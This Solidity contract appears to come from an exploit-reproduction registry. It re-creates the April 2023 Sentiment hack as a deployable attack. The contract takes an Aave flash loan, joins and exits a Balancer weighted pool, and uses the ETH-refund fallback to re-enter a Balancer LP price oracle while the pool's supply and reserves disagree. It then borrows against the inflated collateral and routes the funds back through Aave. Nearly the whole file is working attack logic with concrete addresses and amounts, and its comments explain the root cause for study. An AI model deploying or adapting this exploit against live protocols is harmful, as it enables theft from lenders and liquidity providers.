// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-Sentiment).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (ContractTest itself is the Aave flash-loan receiver, the Balancer joinPool/exitPool
// caller, AND the fallback()-based read-only-reentrancy trigger) — there is no
// standalone exploit contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack (testExploit -> executeOperation -> depositCollateral ->
// joinPool -> exitPool -> fallback -> borrowAll) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// evm-hack-registry/2023-04-Sentiment_exp/test/Sentiment_exp.sol.
//
// Root cause: Balancer V2's exitPool burns the exiting user's BPT (shrinking
// totalSupply) BEFORE it hands back the underlying reserves. WeightedBalancerLPOracle
// reads getPoolTokens() (still-full reserves) and totalSupply() (already-shrunk) with
// no reentrancy guard, so a read-only reentry into getPrice() during the exit window
// sees invariant(full reserves) / totalSupply(post-burn) -> the LP price spikes ~16x.
// Sentiment's AccountManager.borrow() re-prices collateral via that same oracle inside
// the attacker-controlled fallback (an ETH refund from the exit), so the borrow is
// sized against the fictitious, inflated collateral value.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function withdraw(uint256 wad) external;
    function deposit(uint256 wad) external returns (bool);
}

interface IBalancerToken is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] asset;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] asset;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request)
        external
        payable;

    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request)
        external
        payable;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAccountManager {
    function riskEngine() external;
    function openAccount(address owner) external returns (address);
    function borrow(address account, address token, uint256 amt) external;
    function deposit(address account, address token, uint256 amt) external;
    function exec(address account, address target, uint256 amt, bytes calldata data) external;
    function approve(address account, address token, address spender, uint256 amt) external;
}

interface IWeightedBalancerLPOracle {
    function getPrice(address token) external view returns (uint256);
}

contract SentimentDrain {
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 constant FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    address constant FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;

    IBalancerToken constant balancerToken = IBalancerToken(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);
    IBalancerVault constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan constant aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAccountManager constant AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);
    IWeightedBalancerLPOracle constant WeightedBalancerLPOracle =
        IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);

    address account;
    bytes32 PoolId;
    uint256 nonce;

    // step 0: kick off the Aave V3 flash loan (WBTC + WETH + USDC). executeOperation
    // below runs the rest of the attack from inside the flash-loan callback.
    function run() external {
        AccountManager.riskEngine();

        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 606 * 1e8;
        amounts[1] = 10_050_100 * 1e15;
        amounts[2] = 18_000_000 * 1e6;
        uint256[] memory modes = new uint256[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata, /* amounts */
        uint256[] calldata, /* premiums */
        address, /* initiator */
        bytes calldata /* params */
    ) external payable returns (bool) {
        depositCollateral(assets);
        joinPool(assets);
        exitPool();
        WETH.approve(address(aaveV3), type(uint256).max);
        WBTC.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);
        return true;
    }

    // step 1: unwrap 0.1 WETH -> ETH (pays for the joinPool value: below), open a
    // Sentiment margin account, and deposit 50 WETH as REAL collateral so the
    // account exists and is "healthy" before the price is manipulated.
    function depositCollateral(
        address[] calldata assets
    ) internal {
        WETH.withdraw(100 * 1e15);
        account = AccountManager.openAccount(address(this));
        WETH.approve(address(AccountManager), 50 * 1e18);
        AccountManager.deposit(account, address(WETH), 50 * 1e18);
        AccountManager.approve(account, address(WETH), address(Balancer), 50 * 1e18);
        PoolId = balancerToken.getPoolId();
        uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 0;
        amountIn[1] = 50 * 1e18;
        amountIn[2] = 0;
        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_1 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
        // "joinPool(bytes32,address,address,(address[],uint256[],bytes,bool))"
        bytes memory execData = abi.encodeWithSelector(0xb95cac28, PoolId, account, account, joinPoolRequest_1);
        AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH into the account's own Balancer position
    }

    // step 2: join the WBTC/WETH/USDC weighted pool with the bulk of the flash-loaned
    // funds, minting a huge BPT position to the attacker contract itself.
    function joinPool(
        address[] calldata assets
    ) internal {
        WETH.approve(address(Balancer), 10_000 * 1e18);
        WBTC.approve(address(Balancer), 606 * 1e18);
        USDC.approve(address(Balancer), 18_000_000 * 1e6);
        uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 606 * 1e8;
        amountIn[1] = 10_000 * 1e18;
        amountIn[2] = 18_000_000 * 1e6;
        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_2 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
        Balancer.joinPool{value: 0.1 ether}(PoolId, address(this), address(this), joinPoolRequest_2);
    }

    // step 3: exit the ENTIRE BPT position. Balancer burns the BPT (shrinking
    // totalSupply) before it pays out the underlying reserves - the ETH-refund
    // fallback below fires DURING that inconsistent window.
    function exitPool() internal {
        balancerToken.approve(address(Balancer), 0);
        address[] memory assetsOut = new address[](3);
        assetsOut[0] = address(WBTC);
        assetsOut[1] = address(0);
        assetsOut[2] = address(USDC);
        uint256[] memory amountOut = new uint256[](3);
        amountOut[0] = 606 * 1e8;
        amountOut[1] = 5000 * 1e18;
        amountOut[2] = 9_000_000 * 1e6;
        uint256 balancerTokenAmount = balancerToken.balanceOf(address(this));
        bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);
        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest({
            asset: assetsOut,
            minAmountsOut: amountOut,
            userData: userDatas,
            toInternalBalance: false
        });
        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);
        address(WETH).call{value: address(this).balance}("");
    }

    // The read-only-reentrancy trigger: Balancer's WETH payout during exitPool()
    // arrives here as a plain ETH transfer BEFORE the Vault has finished settling.
    // On the 3rd fallback invocation (nonce becomes 2 -> the exitPool payout), the
    // oracle is re-entered and borrowAll() executes against the inflated price.
    fallback() external payable {
        if (nonce == 2) {
            borrowAll();
        }
        nonce++;
    }

    // step 4 (inside the reentrant callback): borrow against the now fictitiously
    // overvalued BPT collateral - each borrow's isAccountHealthy() check passes only
    // because WeightedBalancerLPOracle.getPrice() is currently returning the
    // manipulated ~16x price.
    function borrowAll() internal {
        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);
        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);
        AccountManager.borrow(account, address(WETH), 81 * 1e18);
        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);
        AccountManager.approve(account, address(FRAX), FRAXBP, type(uint256).max);
        bytes memory execData =
            abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 0, 1, 120_000 * 1e18, 1);
        AccountManager.exec(account, FRAXBP, 0, execData);
        AccountManager.approve(account, address(USDC), address(aaveV3), type(uint256).max);
        AccountManager.approve(account, address(USDT), address(aaveV3), type(uint256).max);
        AccountManager.approve(account, address(WETH), address(aaveV3), type(uint256).max);
        bytes memory execData2 =
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDC), 580_000 * 1e6, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData2);
        execData2 =
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDT), 360_000 * 1e6, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData2);
        execData2 =
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(WETH), 80 * 1e18, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData2);
        execData2 = abi.encodeWithSignature(
            "withdraw(address,uint256,address)", address(USDC), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData2);
        execData2 = abi.encodeWithSignature(
            "withdraw(address,uint256,address)", address(USDT), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData2);
        execData2 = abi.encodeWithSignature(
            "withdraw(address,uint256,address)", address(WETH), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData2);
    }
}
